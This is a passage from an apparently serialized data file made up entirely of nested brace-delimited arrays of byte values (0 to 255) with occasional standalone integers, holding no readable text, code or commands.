15,0,119,89,176,59,102,49,180,61,130,9,159,9,190,144,106,98,82,27,88,245,113,95,169,237,131,142,22,162,135,237,137,187,228,216,33,31,83,36,34,205,67},{18649}},{{{98,209,14,76,98,192,125,160,226,53,204,18,227,111,177,4,195,209,232,116,242,123,102,236,182,96,206,100,158,138,246,173,203,212,46,157,42,103,155,126,169,133,113,14,239,213,104,128,218,209,169,153,46,34,146,245,214,246,18,156,30,153,56,210},{210,212,138,149,103,201,58,178,199,192,14,34,21,241,118,77,107,182,165,61,71,143,135,14,104,187,75,147,190,220,4,129,99,178,58,127,227,205,118,33,125,172,202,161,9,196,241,240,254,102,54,60,48,6,248,116,248,223,93,251,167,84,15,241},{160,51,250,51,237,114,69,89,132,66,37,253,170,119,94,30,116,96,37,229,210,72,219,59,91,132,113,217,225,187,226,54,17,119,82,204,234,64,205,112,24,48,97,248,21,10,5,216,147,90,242,176,67,32,28,123,145,56,102,104,187,247,30,198},{94,3,13,89,241,22,167,93,35,71,210,33,117,233,228,147,237,178,230,54,143,3,144,132,155,168,232,161,66,4,112,15,132,230,82,102,171,26,216,237,125,36,93,108,38,158,76,70,40,83,145,111,144,101,147,62,6,20,246,223,76,70,67,214},{37,142,40,13,107,213,122,177,78,217,237,221,114,55,67,39,142,233,77,76,180,164,193,108,103,161,166,117,59,241,89,63,15,40,248,31,39,251,174,6,154,105,138,228,127,90,26,102,160,8,203,85,38,13,253,69,232,2,70,211,180,145,130,128},{233,96,206,214,238,120,19,179,255,60,221,8,39,31,190,50,99,14,244,85,201,15,178,158,113,132,125,242,146,121,118,252,108,167,150,22,214,206,108,255,135,234,91,210,173,140,236,198,139,129,227,11,80,5,136,132,64,63,145,171,63,243,122,205},{76,145,70,22,76,5,233,248,30,179,155,176,207,208,140,73,50,227,2,14,233,61,93,149,193,81,89,103,142,23,71,177,186,69,251,32,19,138,144,157,136,226,148,3,106,110,130,172,167,33,137,142,237,70,228,176,202,37,12,244,59,58,193,220}},{86,38,80,172,131,130,126,98,214,233,239,98,89,214,185,135,171,151,222,1,144,249,217,3,173,46,132,88,196,212,100,40,182,71,101,52,117,166,71,144,23,115,200,178,185,252,40,43,173,72,54,210,28,194,111,80,132,192,23,233,119,186,237,200,158,172,153,168,95,211,143},{4117}},{{{148,59,161,250,172,227,131,243,68,196,193,230,81,12,109,31,21,46,54,125,73,135,16,193,34,123,173,164,249,101,19,31,194,194,248,65,113,217,182,60,4,102,30,154,12,132,59,32,187,241,90,54,5,66,238,175,49,30,173,64,132,63,115,218},{57,15,79,86,93,82,237,43,198,169,137,69,3,208,207,66,244,23,215,62,19,234,112,145,50,173,201,49,178,117,112,32,11,235,155,48,206,203,253,178,119,205,57,70,192,50,116,178,235,24,46,219,191,2,135,125,97,97,153,196,72,94,41,248},{8,141,181,128,99,193,145,123,82,56,225,195,136,47,15,119,151,84,218,149,249,136,52,91,167,131,63,249,212,228,103,110,184,222,248,12,59,181,236,241,218,127,27,40,94,230,66,4,102,31,130,246,200,43,163,210,227,184,68,207,188,35,150,72},{59,191,176,142,175,75,10,1,48,117,120,198,153,210,218,4,186,217,16,17,80,113,77,118,55,174,29,219,204,160,168,246,32,78,204,108,130,192,206,129,200,83,114,157,239,245,142,118,209,73,95,254,42,251,192,29,129,60,76,59,82,119,80,86},{45,113,178,166,12,22,195,158,218,26,66,80,62,181,111,231,159,219,54,113,100,218,130,124,97,68,214,86,186,189,38,74,139,23,213,201,247,14,205,89,16,122,91,147,199,97,136,16,84,39,146,195,173,196,180,43,123,110,151,119,133,182,251,89},{23,221,92,213,103,107,237,191,112,58,35,154,44,113,92,236,53,103,29,139,74,231,100,184,179,174,238,213,35,197,34,67,188,38,153,165,84,174,65,142,107,225,232,162,250,241,8,225,234,237,208,135,243,2,156,101,124,159,207,70,103,174,88,157},{2,188,122,179,86,94,108,134,39,236,254,87,192,106,218,96,254,190,61,112,46,158,38,188,199,42,248,36,219,79,207,49,123,105,7,69,10,94,142,98,160,252,197,121,120,80,220,221,224,127,113,45,9,11,31,70,228,204,68,76,72,252,85,70}},{246,78,157,200,113,14,219,64,36,54,247,148,134,216,183,160,12,7,118,97,97,177,124,146,213,157,242,97,127,229,146,42,202,23,92,114,111,87,64,47,161,69,185,65,110,92,171,5,5,159,195,131,111,131,96,224,183,94,85,4,255,231,180,165,201,185,193,168,224,36,215,74,218,163,29,60,187,94,42,154,205,24,222,43,54,224,86,98},{47446}},{{{29,51,220,64,40,170,167,79,156,19,182,135,79,114,34,228,24,232,250,3,1,156,218,129,217,247,43,196,171,110,141,62,111,74,139,196,94,62,25,193,171,243,225,244,97,223,210,17,101,254,64,229,94,218,130,111,103,150,11,236,120,145,21,202},{156,93,188,189,36,163,100,136,83,65,241,204,189,49,117,78,198,227,110,91,151,205,153,202,32,204,148,84,153,116,124,136,163,73,37,72,168,41,196,140,218,174,234,72,214,179,134,74,199,156,21,241,39,12,58,145,5,217,27,29,126,208,102,195},{117,178,89,240,79,161,12,248,103,49,238,41,202,28,249,103,198,31,210,199,44,159,74,145,224,163,78,153,93,191,153,157,244,63,205,155,35,84,202,214,55,170,113,101,2,31,24,162,72,129,62,42,170,195,29,247,55,222,50,192,117,223,46,165},{243,241,215,80,67,113,229,121,180,90,28,189,92,169,45,2,52,212,236,58,128,19,62,180,187,187,151,55,112,7,113,122,104,1,224,211,27,61,139,62,231,40,195,5,43,114,42,4,170,244,251,9,119,90,33,23,232,87,80,95,156,95,157,208},{59,104,62,59,25,253,2,140,92,253,238,199,195,222,200,91,154,108,88,92,160,38,137,89,149,199,240,63,172,216,61,76,46,165,251,42,25,93,244,225,80,147,61,191,70,117,174,249,68,115,222,222,93,187,119,33,251,115,138,250,52,153,186,223},{175,212,58,117,192,180,221,72,106,144,194,87,233,86,166,73,228,220,45,139,199,93,25,7,6,196,200,103,62,196,175,255,132,210,235,36,125,122,210,115,106,216,69,18,149,135,5,192,128,192,220,185,96,254,126,140,135,249,96,62,208,64,87,205},{10,113,44,218,55,144,46,131,147,170,159,82,10,140,133,229,192,80,170,21,134,188,167,26,55,89,136,190,125,37,155,83,165,219,110,244,243,44,53,62,76,165,84,126,148,249,100,23,66,152,94,223,244,78,123,113,117,185,245,240,60,27,41,187}},{9,66,68,234,242,20,74,149,228,39,180,190,20,126,34,162,192,113,25,40,29,88,190,195,90,96,87,13,22,189,126,25,252,141,180,41,44,205,106,66,32,8,40,15,246,112,182,233,241,145,108,30,210,38,47,222,38,147,190,52,238,92,192},{14444}},{{{8,255,219,136,38,106,157,48,55,105,247,226,46,224,72,67,186,123,198,15,37,151,147,227,96,55,232,38,120,138,212,87,53,23,173,32,134,194,177,182,150,144,19,160,226,81,169,211,152,93,95,184,21,165,161,249,137,183,232,246,20,247,99,26},{174,102,116,188,59,151,23,109,86,48,238,222,219,143,174,236,16,175,18,255,84,44,16,44,29,154,157,62,128,249,185,200,205,166,136,245,117,254,152,16,229,98,214,248,46,244,92,133,14,214,143,254,81,43,116,252,243,255,217,14,181,129,124,54},{20,48,214,59,205,84,74,206,134,240,109,164,92,180,232,233,91,217,255,183,208,217,244,186,137,218,24,48,45,3,230,252,242,196,227,217,228,51,147,253,243,131,48,199,185,188,142,145,109,60,5,20,50,206,137,164,212,38,162,248,250,1,28,136},{250,33,252,192,182,130,235,192,50,6,83,165,112,79,208,3,202,29,188,175,68,175,32,162,54,209,28,47,161,72,107,26,203,231,221,60,79,69,68,102,90,108,235,33,18,115,13,230,40,222,130,166,220,252,78,227,133,159,106,183,8,2,202,177},{168,241,184,219,125,172,138,214,169,5,146,80,189,15,220,129,156,131,213,247,178,190,242,106,6,126,42,161,215,158,157,249,254,141,197,218,233,29,47,214,51,229,171,75,245,100,63,151,125,95,109,217,19,253,190,217,236,3,24,36,183,17,68,87},{138,143,89,224,121,223,238,105,122,109,225,149,99,42,172,226,224,46,115,226,104,251,6,2,20,161,130,175,216,194,43,2,243,190,99,144,186,49,10,198,124,22,225,185,91,83,255,252,28,164,137,210,169,104,205,212,72,173,91,20,23,82,107,143},{109,194,12,98,153,8,15,221,62,24,17,115,157,189,38,130,122,204,3,237,253,147,34,128,66,118,226,71,38,43,63,87,83,225,222,138,116,208,178,222,224,68,253,149,77,24,22,116,51,108,19,81,231,78,110,149,90,192,30,161,225,116,66,204}},{255,178,61,42,61,149,116,183,198,175,120,223,125,93,163,62,186,251,177,225,108,5,109,175,70,19,44,117,254,75,124,143,100,142,11,53,111,163,4,126,66,187,226,24,159,207,203,124,58,69,223,190,126,83,195,205,188,183,44,173,130,159,49,159,131,139,129,6,55,77,26,160,206,54,33,145,240,152,87,154,88,182,21,68,120,231,211,9,232,32,21,137,236,227,62,145,209,250,101,210,144,87,74,214},{34840}},{{{119,161,28,90,207,11,153,215,147,203,32,198,44,247,77,227,152,75,101,125,55,234,62,23,34,73,90,102,23,3,133,76,247,32,89,26,24,210,76,196,167,159,92,196,75,99,176,158,130,235,37,208,10,51,105,135,201,207,71,15,59,58,238,145},{102,8,114,237,180,223,221,118,27,95,243,231,4,205,113,53,28,255,9,48,98,251,221,79,184,249,178,103,203,32,41,106,23,238,199,48,55,1,26,27,101,183,219,161,130,99,61,247,196,188,23,45,61,219,106,114,219,111,138,28,197,51,207,27},{104,91,70,101,82,67,246,23,121,121,153,253,23,98,211,240,218,56,186,240,73,3,182,214,91,224,104,120,189,161,174,241,84,68,185,75,191,59,37,128,154,91,89,4,51,69,192,46,173,238,46,148,131,126,202,145,7,229,163,80,23,76,15,219},{211,116,124,89,55,217,221,107,51,110,191,94,146,70,64,194,237,72,61,232,51,84,64,107,108,174,165,6,8,33,23,100,195,94,217,231,161,237,98,170,176,171,175,14,216,225,235,242,178,193,119,240,92,217,171,250,250,137,121,159,229,172,222,162},{3,56,2,209,235,136,178,147,78,68,227,171,69,34,206,110,254,73,166,9,201,190,196,132,220,52,113,155,90,186,10,55,59,80,70,98,55,61,152,164,186,22,104,174,208,150,255,202,132,24,65,250,173,51,180,171,58,8,72,186,109,63,239,147},{89,103,244,44,224,152,102,183,35,80,112,135,209,124,21,3,135,201,42,127,215,27,31,132,7,125,141,120,15,168,181,45,105,74,220,15,116,228,64,159,54,28,78,97,138,18,172,20,120,88,89,131,132,248,16,202,108,139,25,255,130,85,142,158},{167,162,214,40,141,84,160,77,3,214,116,145,230,154,180,129,111,214,191,224,163,104,133,81,35,99,131,99,120,103,223,60,171,18,242,110,237,27,131,245,254,72,222,24,145,31,185,117,162,227,111,103,157,134,158,79,238,240,130,58,14,67,66,50}},{209,203,187,69,7,251,165,76,46,62,233,6,151,62,77,228,3,124,40,38,72,89,38,68,101,145,187,171,111,80,231,13,0,8,75,7,84,229,51,34,126,175,182,141,63,66,122,51,167,193,200,82,248,190,203,120,98,61,56,164,142,24,140,246,100,39,250,71,238,185,120,232,100,65,217,124,75},{58874}},{{{39,82,82,30,16,79,123,199,224,37,117,166,192,22,12,246,154,17,174,203,130,187,222,225,104,57,188,93,27,87,96,58,77,227,227,59,209,246,81,252,222,35,82,186,182,143,33,116,195,2,85,168,50,42,148,178,185,204,110,39,224,242,182,107},{25,131,186,3,165,162,149,98,134,177,232,28,250,9,184,224,61,205,219,218,229,105,183,247,17,33,231,111,248,201,195,15,19,141,215,108,171,15,90,17,205,178,149,43,207,9,129,62,240,90,80,159,186,128,218,12,30,231,171,52,68,91,185,2},{129,203,140,31,194,33,212,110,205,131,135,188,68,204,138,212,37,203,220,83,15,202,157,56,226,119,170,140,213,26,128,157,167,155,205,120,238,158,118,13,14,68,38,49,208,131,193,37,153,15,105,133,54,112,85,13,115,156,229,187,12,133,237,28},{185,41,247,118,54,6,158,152,4,228,11,54,26,39,73,180,223,100,204,61,97,34,239,164,122,207,6,153,80,51,38,76,57,173,146,74,11,153,72,66,32,86,90,51,185,45,118,59,128,32,84,86,155,253,160,52,73,69,188,212,122,253,74,48},{173,153,65,193,203,91,188,216,3,115,63,231,149,58,35,93,97,41,162,24,234,82,248,47,87,167,198,186,105,239,143,86,51,71,55,67,172,171,241,68,149,77,5,166,133,110,105,235,244,227,103,242,72,215,1,219,81,7,129,168,237,156,135,56},{37,204,154,225,189,187,155,157,94,70,117,126,90,141,163,6,32,153,250,187,26,65,94,25,186,26,254,64,19,236,45,172,221,38,87,180,156,129,213,28,12,67,38,200,161,56,243,178,74,223,18,89,159,132,24,79,249,54,71,154,195,151,184,15},{84,48,255,184,175,221,194,100,45,74,123,8,176,171,119,226,163,232,169,202,86,151,27,229,41,32,66,251,64,173,210,102,198,46,100,180,225,51,97,175,142,123,188,24,116,120,49,189,39,8,5,92,179,76,6,158,34,233,241,232,125,209,192,49}},{138,103,106,244,202,60,160,98,9,134,75,110,156,137,17,209,36,81,33,10,218,155,116,124,191,165,90,61,234,141,252,218,246,8,169,89,206,147,133,142,79,129,174,216,225,231,229,139,10,222,66,143,58,171,123,177,199,96,86,58,40,100,194,208,228,201,163,54,151,97,181,160,230,5,84,164,198,20,87,177,147,216,184,7,5,101,1,66,49,20,47,149,53,111,117,132,163,190,22,21,112,147,190,236,254,58,194,202,73,3},{59842}},{{{212,140,238,202,91,108,77,4,159,92,77,125,196,223,119,233,89,14,180,240,40,43,243,79,151,228,9,163,119,151,93,16,33,85,178,104,148,226,31,35,213,113,135,140,223,154,103,163,225,230,249,187,253,99,143,255,28,83,6,58,145,103,66,214},{87,170,171,184,149,122,76,176,156,176,234,188,131,142,67,221,172,44,196,64,204,125,205,31,15,193,107,191,200,5,74,210,71,57,88,243,231,18,106,60,51,243,127,11,180,126,253,140,238,46,15,77,128,19,57,101,192,125,65,6,105,181,174,13},{124,237,58,91,52,118,139,187,45,29,196,160,11,79,174,95,103,81,122,242,92,226,176,3,221,50,164,184,8,143,177,159,201,174,213,69,207,228,122,37,28,20,97,129,228,101,242,199,249,10,198,98,194,112,196,92,128,14,216,31,5,17,253,64},{168,93,171,117,127,163,90,56,161,80,130,6,4,31,119,193,132,159,235,183,210,189,93,196,248,21,13,8,22,3,22,146,164,50,185,102,179,140,58,111,35,244,196,95,62,107,255,154,34,83,194,242,102,38,48,95,204,127,125,236,221,195,198,184},{29,213,101,43,20,95,175,159,218,241,20,157,36,30,211,39,177,155,228,239,122,250,211,132,222,59,183,22,249,16,58,220,133,169,96,38,25,172,5,216,182,168,224,130,143,250,17,163,129,118,37,128,200,158,140,216,155,81,32,192,3,9,112,155},{162,222,82,89,129,85,88,252,36,31,5,183,231,103,94,237,56,150,246,137,189,249,93,128,51,58,46,61,131,136,201,21,193,49,102,190,255,31,129,103,145,91,41,142,114,155,56,215,98,127,167,99,61,14,209,66,230,150,41,97,45,74,241,36},{23,242,18,39,70,65,248,216,1,81,82,88,70,121,251,58,95,177,166,181,215,221,106,190,171,246,128,99,225,144,190,62,69,153,125,38,58,134,84,210,96,101,105,70,230,167,123,224,122,57,146,129,194,156,203,140,122,206,229,192,79,124,71,14}},{227,150,1,130,52,38,130,230,119,110,43,222,113,112,21,243,33,170,164,231,15,141,110,77,2,218,188,65,106,126,94,210,180,220,223,75,52,229,15,24,1,2,136,216,190,255,178,187,230,254,52,151,82,140,194,238,8,183,171,118,122,34,4,166,37,205,172,125,71,216,90,9,158,140,158,52,222,142,207,223,43,92},{50358}},{{{57,38,22,224,95,103,134,47,151,152,206,102,239,240,186,212,205,216,239,112,144,170,19,41,106,243,5,217,77,168,194,59,74,128,207,30,186,107,27,140,126,115,105,103,44,101,114,232,38,251,72,147,207,233,119,27,114,219,197,118,216,112,31,191},{54,194,98,98,177,51,85,222,223,232,62,125,201,51,220,25,182,251,40,18,230,54,203,248,194,75,175,140,194,91,220,50,244,172,164,86,142,113,69,16,64,192,234,216,247,54,165,253,107,40,241,16,157,139,161,178,108,48,24,154,30,39,21,68},{184,24,28,246,74,131,174,247,179,241,20,161,128,118,37,194,95,167,127,6,213,211,184,131,48,197,185,110,5,244,185,159,21,243,136,184,35,242,45,65,72,107,244,193,198,20,175,197,187,123,237,8,80,168,144,203,218,80,174,197,78,159,89,183},{54,48,218,213,23,152,69,252,93,8,100,60,54,140,165,113,55,115,45,16,26,55,66,189,87,164,234,9,248,45,237,56,78,124,52,174,80,230,173,100,171,171,168,20,112,101,45,74,248,180,187,206,135,122,81,180,59,181,59,166,1,17,82,19},{145,36,96,185,1,15,231,229,116,164,192,171,200,51,116,61,80,162,125,209,191,49,99,238,254,80,49,118,229,18,183,241,218,60,47,246,222,182,244,132,251,135,94,167,166,89,54,194,106,48,99,82,194,92,119,69,218,225,104,73,30,212,192,58},{130,206,169,105,97,49,236,68,33,114,17,33,191,34,115,136,80,158,16,112,198,198,172,92,187,160,183,212,50,115,13,108,27,203,11,182,22,170,68,123,176,226,55,81,147,181,182,146,228,139,254,144,123,96,188,38,157,146,233,205,159,77,208,225},{214,182,225,198,86,49,230,106,146,216,163,179,1,43,192,155,172,253,181,115,20,78,195,198,213,44,224,87,18,71,106,94,73,218,108,200,105,52,153,188,161,200,246,186,149,218,124,179,60,195,29,216,239,64,126,255,161,255,223,38,57,146,67,73}},{189,232,3,152,59,232,221,171,22,5,90,20,7,69,220,218,38,37,78,189,233,94,171,63,69,48,248,19,124,205,208,115,120,183,208,23,85,81,111,105,75,41,204,113,208,39,242,49,108,92,128,150,112,203,121,8,2,189,47,47,16,106,196,51,31,97,104,67,141,94,180,123,69,24,46,135,133,7,86,101,2,118,83,244,84,117,238,186,71,254,133,183,150,85,182,162,225,157,186,109,2,218,191,119,173,29,97,7,63,202,224,85},{42589}},{{{244,224,86,246,12,78,224,36,151,151,144,46,148,170,124,237,206,206,31,208,106,34,198,163,33,232,196,221,67,69,61,226,227,69,26,178,192,145,23,136,248,117,75,168,124,233,2,210,135,34,185,136,87,210,211,8,69,33,166,72,24,72,65,29},{94,64,16,67,144,152,176,85,72,218,208,226,99,47,53,109,90,103,152,251,255,150,190,163,152,245,14,68,210,64,62,198,147,58,244,240,221,196,124,145,184,203,11,11,35,203,76,187,209,158,148,216,238,185,162,128,134,249,93,186,107,156,108,41},{161,234,134,178,108,129,133,11,227,140,170,1,16,235,90,51,224,87,7,152,89,140,53,246,129,71,47,67,95,87,114,118,189,32,167,51,103,86,12,42,187,200,137,79,148,91,2,224,17,252,69,230,25,13,85,49,92,14,21,235,213,85,26,114},{217,172,23,209,99,172,71,169,5,103,157,9,21,121,55,221,52,221,178,238,89,64,85,214,12,247,207,245,118,117,94,8,52,52,12,46,231,125,107,62,177,236,116,223,108,253,148,50,201,35,185,149,89,67,171,173,100,39,73,140,7,236,107,15},{139,25,161,219,40,247,201,20,179,22,204,102,81,3,34,100,112,210,224,160,105,82,251,119,25,20,120,141,219,190,92,34,199,16,99,75,177,195,126,104,217,101,61,65,217,6,104,70,156,179,13,3,54,84,206,154,139,169,90,204,83,250,30,69},{46,216,219,31,23,141,35,47,142,140,252,68,67,222,196,23,250,28,37,162,104,111,129,54,44,112,202,180,130,88,231,200,86,224,216,146,2,183,232,46,106,186,127,95,7,26,83,185,44,211,127,6,1,191,231,191,41,21,249,142,116,117,146,229},{229,210,9,41,239,188,150,24,129,28,25,4,33,39,145,254,211,30,13,182,80,92,179,232,112,209,148,63,129,208,86,228,188,101,142,34,2,120,218,144,195,191,123,127,78,198,157,113,203,252,177,92,16,92,119,43,117,33,101,150,82,141,143,241}},{236,209,36,134,170,105,47,224,2,168,48,129,159,229,84,253,109,36,164,55,76,92,167,119,113,37,241,149,242,95,37,99,28,203,103,71,249,122,130,194,151,30,181,82,105,112,17,158,85,68,141,224,180,255,175,135,19,210,124,86,103,150,50,6,71,1,182,239,223,139,219,222,82,37,165,20,198,120,225,14,186,173,136,144,97,214,13,186,231,35,216,196,197,105,88,202,180,227,158,150,27,188,210,49,3,161,41,184,217,55},{28946}},{{{140,28,173,185,246,100,45,79,107,14,187,217,160,163,151,99,178,144,3,153,132,197,236,67,180,128,95,185,91,73,54,189,69,254,213,197,124,120,48,224,125,11,81,170,118,188,7,64,102,28,249,190,241,203,77,222,118,147,222,54,162,193,47,251},{185,110,201,103,250,153,162,2,10,209,208,69,129,58,160,151,170,181,177,46,27,206,242,206,11,202,92,231,188,21,234,163,41,127,167,203,246,122,208,102,106,76,251,205,156,117,64,195,28,145,167,118,222,45,248,17,102,123,51,127,53,201,153,238},{19,56,230,29,97,112,10,116,252,164,253,122,47,203,209,194,96,148,74,223,183,111,142,44,122,121,79,72,11,179,109,99,110,17,226,168,223,27,26,163,184,84,41,171,140,150,90,6,164,42,73,58,106,130,88,70,191,31,182,86,209,152,47,208},{155,118,134,132,248,189,174,217,179,28,62,61,143,58,159,18,56,113,43,132,221,82,94,156,59,188,93,228,216,166,130,89,39,216,73,178,27,179,229,155,172,71,75,194,177,19,61,221,55,100,157,209,18,181,190,160,128,188,113,39,30,128,204,155},{56,15,125,101,5,10,46,248,181,141,16,205,86,244,150,182,68,187,13,103,48,156,91,251,217,117,112,202,166,104,239,72,199,123,52,107,220,107,30,105,254,13,115,99,174,203,187,197,226,100,173,43,250,224,76,108,132,111,182,16,163,244,168,46},{234,177,200,205,245,8,238,72,233,97,166,175,186,228,12,253,12,183,113,237,57,207,55,231,151,204,80,20,32,161,101,58,161,169,253,165,104,225,241,6,230,232,195,179,156,1,154,15,213,172,176,243,130,202,245,216,172,158,66,97,211,84,8,97},{197,151,186,5,135,95,137,248,29,175,135,233,31,160,229,50,180,191,224,210,79,47,36,103,165,72,144,124,12,64,246,17,27,193,180,216,18,173,159,87,170,214,247,126,36,83,62,30,6,5,13,43,65,146,175,194,39,231,128,242,184,37,119,73}},{232,230,38,69,65,17,30,164,184,121,9,130,154,4,2,96,200,223,133,126,28,138,107,85,82,99,57,27,113,132,78,188,101,250,56,120,4,230,43,96,122,225,65,146,36,27,247,58,22,84,94,112,47,154,193,87,149,34,97,188,226,229,208,34,5,24,244,94,158,123,208,45,40,241,181,169,128,74,231,59,191,89,1,201,29,75,135,114,182,247,217,120,75,215,84,232,54,4,252,198,243,170,188,11,28,106,253},{14950}},{{{226,253,123,242,81,195,104,107,238,209,162,48,47,215,214,191,216,128,197,95,186,234,236,116,143,69,27,7,224,86,214,154,72,139,71,116,75,212,158,53,11,28,80,228,252,219,218,186,9,148,218,94,52,97,23,79,26,86,77,66,30,56,248,101},{131,81,94,125,7,73,245,159,5,239,35,23,47,186,73,111,10,1,101,206,48,95,218,168,255,250,172,124,88,178,154,169,246,123,19,41,179,207,32,165,224,32,43,210,11,233,201,32,241,72,47,171,234,219,224,1,244,62,71,138,82,94,82,119},{14,95,174,10,87,204,111,95,79,4,87,32,37,86,7,45,173,195,83,60,42,199,90,193,159,90,50,27,98,157,89,50,75,219,137,247,196,122,92,206,54,212,192,203,53,177,131,104,250,115,168,165,63,173,218,63,201,221,144,196,186,16,91,175},{110,29,200,123,85,10,84,37,236,188,242,89,77,235,176,220,109,75,104,56,97,243,65,33,239,112,186,190,195,104,208,255,142,65,87,92,208,183,26,81,58,114,20,184,210,57,87,208,75,107,61,244,249,139,214,136,117,213,14,226,217,149,41,60},{237,239,218,244,172,78,199,116,201,213,201,145,116,94,140,173,25,203,54,13,221,239,166,129,146,128,237,223,224,47,70,17,189,152,156,238,182,242,71,142,71,226,249,110,151,10,240,101,171,103,3,108,158,108,11,207,166,108,236,6,225,251,113,58},{84,255,35,26,7,73,112,45,85,66,74,102,8,101,10,115,59,19,115,82,243,243,224,111,170,106,244,230,233,102,155,229,18,110,87,61,235,24,19,201,163,157,53,209,71,179,174,69,202,115,165,82,3,173,70,108,252,188,159,83,206,76,214,174},{133,187,231,213,248,12,200,39,138,66,144,142,92,115,184,228,9,11,96,6,245,117,186,43,217,44,104,184,20,201,119,193,168,4,181,143,199,30,100,71,62,145,46,245,204,86,94,38,8,17,18,131,49,37,203,47,47,207,7,146,33,50,174,210}},{177,51,232,78,119,166,142,254,218,121,95,94,248,231,88,59,131,200,81,251,106,213,252,151,193,177,208,144,153,171,45,109,4,0,90,173,72,189,71,173,30,153,106,48,107,9,49,155,163,227,224,134,93,183,50,206,236,0,105,85,5,160,122,97,178,60,75,8,164,67,138,129,48,202,188,166,16,22,39,36,220,226,26,4,2,14},{53834}},{{{191,11,107,132,26,120,142,159,228,183,229,170,88,140,47,23,48,210,139,104,68,152,133,208,5,45,155,147,40,19,42,80,34,42,107,226,159,75,41,206,246,115,242,246,161,35,106,19,153,47,241,6,215,181,56,90,134,177,117,203,33,16,160,56},{201,26,136,210,104,209,138,127,197,70,153,142,185,129,68,18,211,195,53,115,239,225,32,208,153,131,152,188,209,126,104,212,175,91,13,30,16,139,219,226,46,198,178,60,210,31,236,99,99,249,118,124,7,58,10,82,40,76,184,127,8,48,59,210},{21,47,83,119,115,53,176,33,199,190,214,159,132,77,106,199,22,124,5,25,255,220,201,103,223,164,121,188,251,238,203,134,74,157,20,212,139,110,132,138,227,119,99,26,202,131,46,119,19,223,95,117,44,198,133,114,144,27,115,85,203,99,162,154},{198,79,29,74,179,9,130,1,93,205,143,213,168,188,121,175,20,225,96,113,33,44,167,85,224,124,248,152,36,146,152,41,70,27,120,230,71,190,118,250,165,42,101,166,175,226,89,57,68,239,169,28,2,174,78,240,89,35,116,158,195,52,23,136},{139,97,191,124,97,19,140,116,237,148,151,28,207,120,83,245,142,212,253,167,84,156,51,18,124,14,131,53,25,169,234,152,245,204,52,230,156,141,152,246,13,22,111,251,204,190,100,106,199,68,219,173,155,53,242,223,126,61,149,101,46,163,204,12},{185,8,173,163,173,202,94,54,243,255,106,229,94,214,82,115,1,222,65,215,34,154,5,25,62,211,199,236,149,81,91,143,125,102,104,178,72,34,19,13,152,212,184,24,197,3,226,107,71,159,238,183,47,103,69,161,192,190,133,176,133,23,168,202},{160,218,142,49,135,255,244,46,55,147,242,254,84,147,94,192,9,73,128,189,122,229,114,125,57,8,164,12,21,23,226,235,166,101,238,176,34,75,177,181,18,104,139,102,222,77,220,30,214,140,185,81,10,62,112,94,184,178,220,68,130,239,187,68}},{199,182,106,199,136,168,203,9,37,169,118,213,128,244,199,157,165,32,83,254,220,156,178,141,127,82,39,183,106,233,148,110,151,115,112,67,40,67,231,26,68,13,44,241,61,164,203,208,164,148,75,163,130,116,56,127,60,65,124,179,155,220,135,10,62,183,43,210,207,227,108},{33637}},{{{228,107,19,213,104,66,16,180,51,220,217,80,202,174,247,72,225,195,250,17,201,222,222,223,105,3,84,161,110,235,3,253,73,86,40,133,137,209,246,202,250,175,40,217,40,230,161,117,247,66,182,125,117,86,158,74,236,27,104,236,65,113,119,131},{197,247,244,100,125,175,211,36,134,46,252,120,132,86,236,73,156,155,136,86,242,46,87,84,119,32,146,196,185,21,112,30,175,114,35,207,2,180,23,139,175,123,78,193,211,89,93,181,77,112,207,230,206,136,175,195,169,131,68,211,22,7,186,153},{210,180,144,68,45,224,67,95,83,66,121,167,127,153,247,253,66,195,165,112,36,65,47,193,87,191,18,76,124,41,18,225,182,20,146,87,190,28,51,160,90,17,92,148,192,48,125,57,65,248,223,112,115,243,231,82,219,29,225,83,208,252,120,22},{237,127,170,105,67,126,168,48,217,22,231,233,246,23,162,204,10,7,174,112,203,253,168,233,224,165,149,19,225,54,31,50,123,43,85,92,70,152,203,153,181,204,198,8,5,205,173,31,12,129,122,5,62,53,68,87,190,121,200,207,219,249,57,54},{68,3,111,44,21,70,57,157,7,185,153,81,14,28,212,214,102,49,128,142,134,178,183,115,169,205,200,213,243,106,172,162,142,199,117,122,113,150,230,83,200,104,209,127,220,67,114,182,64,88,70,109,125,116,93,18,37,94,139,59,51,140,10,127},{68,138,39,179,35,134,242,77,143,244,240,50,175,70,178,140,126,132,74,254,248,136,217,214,175,169,12,151,136,192,196,66,240,67,190,221,72,141,42,22,178,105,199,224,3,3,195,117,49,95,16,233,94,149,38,126,234,253,176,153,10,60,244,4},{91,25,203,237,214,28,3,126,143,87,105,60,67,247,206,131,203,236,216,233,187,10,223,17,92,230,39,22,166,99,206,90,10,32,249,71,177,59,33,172,125,56,241,214,207,11,100,198,139,176,50,16,171,60,231,20,63,231,16,91,252,100,171,189}},{100,255,10,131,104,174,232,10,16,253,209,15,214,213,219,228,102,135,237,231,251,139,25,10,170,248,193,190,182,230,44,31,33,237,202,168,183,166,220,34,215,103,153,85,17,249,31,46,41,147,55,23,231,83,103,28,61,88,116,119,223,10,184,82,235,221,216,243,138,216,245,94},{9400}},{{{135,41,143,86,116,106,130,223,246,5,109,198,44,27,107,125,223,126,156,120,177,171,174,237,60,224,194,51,32,134,242,237,64,211,61,79,114,153,80,204,182,112,112,147,59,39,3,130,154,159,246,25,186,181,239,113,14,58,42,69,199,203,255,184},{108,92,79,151,241,166,106,95,61,127,123,199,33,122,198,5,234,109,136,156,146,105,115,76,57,253,25,149,70,170,204,2,207,134,201,94,154,205,136,17,9,154,228,164,90,161,99,158,132,139,234,213,190,63,100,147,7,100,217,3,63,213,248,195},{227,137,35,122,112,125,101,130,66,214,142,81,187,129,154,187,255,246,104,37,19,248,225,205,230,78,205,179,215,152,139,20,186,234,135,221,60,189,227,30,81,216,170,58,167,206,146,86,241,6,103,105,168,137,64,153,197,152,116,4,145,111,160,194},{205,188,167,144,205,27,200,112,192,7,191,101,114,149,37,97,34,170,78,67,203,187,53,94,191,222,128,238,214,251,240,231,51,192,99,253,159,165,108,68,219,214,119,46,48,63,131,75,94,215,141,19,232,8,40,87,115,92,190,65,213,174,51,5},{155,46,143,22,211,68,180,218,32,93,169,83,100,202,32,21,75,90,251,25,190,169,100,143,188,54,24,148,144,12,169,82,184,162,33,83,56,45,182,70,52,234,186,198,23,251,57,47,6,26,93,127,48,157,200,133,23,151,147,2,37,131,78,235},{48,129,116,90,242,55,132,166,243,130,111,119,73,79,3,3,104,198,37,81,196,241,195,201,211,129,222,6,182,86,31,108,204,184,142,80,117,210,127,222,202,250,33,21,34,171,19,89,240,228